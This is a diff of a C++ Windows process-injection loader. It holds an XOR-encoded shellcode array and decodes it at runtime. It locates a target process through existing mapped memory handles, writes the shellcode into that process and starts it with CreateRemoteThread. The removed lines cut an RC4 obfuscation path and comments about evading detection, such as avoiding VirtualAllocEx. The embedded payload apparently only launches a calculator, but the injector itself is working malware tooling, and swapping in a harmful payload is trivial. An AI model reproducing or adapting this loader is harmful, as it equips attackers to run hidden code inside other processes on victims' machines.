@@ -15,12 +15,6 @@ typedef NTSTATUS(WINAPI* _SystemFunction033)(
     struct ustring* keyPointer
 );
 
-struct ustring {
-    DWORD Length;
-    DWORD MaximumLength;
-    PVOID Buffer;
-} _data, key, _data2;
-
 char shellcode[] = "\xf6\x42\x89\xee\xfa\xe2\xca\xa\xa\xa\x4b\x5b\x4b\x5a\x58\x5b\x5c\x42\x3b\xd8\x6f\x42\x81\x58\x6a\x42\x81\x58\x12\x42\x81\x58\x2a\x42\x81\x78\x5a\x42\x5\xbd\x40\x40\x47\x3b\xc3\x42\x3b\xca\xa6\x36\x6b\x76\x8\x26\x2a\x4b\xcb\xc3\x7\x4b\xb\xcb\xe8\xe7\x58\x4b\x5b\x42\x81\x58\x2a\x81\x48\x36\x42\xb\xda\x81\x8a\x82\xa\xa\xa\x42\x8f\xca\x7e\x6d\x42\xb\xda\x5a\x81\x42\x12\x4e\x81\x4a\x2a\x43\xb\xda\xe9\x5c\x42\xf5\xc3\x4b\x81\x3e\x82\x42\xb\xdc\x47\x3b\xc3\x42\x3b\xca\xa6\x4b\xcb\xc3\x7\x4b\xb\xcb\x32\xea\x7f\xfb\x46\x9\x46\x2e\x2\x4f\x33\xdb\x7f\xd2\x52\x4e\x81\x4a\x2e\x43\xb\xda\x6c\x4b\x81\x6\x42\x4e\x81\x4a\x16\x43\xb\xda\x4b\x81\xe\x82\x42\xb\xda\x4b\x52\x4b\x52\x54\x53\x50\x4b\x52\x4b\x53\x4b\x50\x42\x89\xe6\x2a\x4b\x58\xf5\xea\x52\x4b\x53\x50\x42\x81\x18\xe3\x5d\xf5\xf5\xf5\x57\x42\xb0\xb\xa\xa\xa\xa\xa\xa\xa\x42\x87\x87\xb\xb\xa\xa\x4b\xb0\x3b\x81\x65\x8d\xf5\xdf\xb1\xea\x17\x20\x0\x4b\xb0\xac\x9f\xb7\x97\xf5\xdf\x42\x89\xce\x22\x36\xc\x76\x0\x8a\xf1\xea\x7f\xf\xb1\x4d\x19\x78\x65\x60\xa\x53\x4b\x83\xd0\xf5\xdf\x69\x6b\x66\x69\x24\x6f\x72\x6f\xa\xa";
 
 unsigned char* XORDecrypt(unsigned char key, unsigned char* payload, int len) {
@@ -121,12 +115,9 @@ ProcessInfo searchForProcess(deque <HANDLE> handlers) {
 
 
 int main(){
-    _SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibraryA("advapi32"), "SystemFunction033");
     deque<HANDLE> returnedHandlers;
     PVOID mAddress;
     ProcessInfo pInfo = ProcessInfo();
-    char name[] = "Local\\S12";
-    char _key[] = "1234567890123456";
 
     MapMemoryObjects mapper = MapMemoryObjects();
     PSYSTEM_HANDLE_INFORMATION mappingResults = mapper.MapMemoryHandlers();
@@ -135,33 +126,10 @@ int main(){
     pInfo = searchForProcess(returnedHandlers);
     
     XORDecrypt(0x0A, (unsigned char*)shellcode, sizeof(shellcode));
-
-    
     WriteProcessMemory(pInfo.hProcess, pInfo.mAddress, shellcode, sizeof(shellcode), NULL);
-
-   /* key.Buffer = (&_key);
-    key.Length = sizeof(_key);
-
-    _data.Buffer = (char*)shellcode;
-    _data.Length = sizeof(shellcode);
-
-    SystemFunction033(&_data, &key);*/
-
-    cout << endl << pInfo.mAddress << "from the process " << pInfo.pid;
-
-    getchar();
-
 
     CreateRemoteThread(pInfo.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) pInfo.mAddress, NULL, 0, NULL);
 
-
-   // SystemFunction033(&_data, &key);
-    
-    /*
-        [!] Process Token - Use a opened process handle
-        [!] Memory Space - Memory Space to avoid the VirtualAllocEx
-        [!] Thread - Suspend and inject in a opened thread handle
-    */
 }
 
 
